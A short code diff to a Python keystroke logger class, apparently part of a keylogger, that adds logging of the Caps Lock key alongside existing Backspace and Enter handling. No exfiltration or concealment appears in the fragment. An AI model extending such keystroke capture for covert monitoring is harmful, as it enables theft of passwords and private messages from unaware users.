@@ -23,6 +23,8 @@ class SimpleClassLogger:
                 self.append_to_log("[BACKSPACE]")
             elif key == Key.enter:
                 self.append_to_log("[ENTER]") #includes ENTER key
+            elif key == Key.caps_lock:
+                self.append_to_log("[CAPSLOCK]") #includes CAPSLOCK key
             else:             
                 pass
 
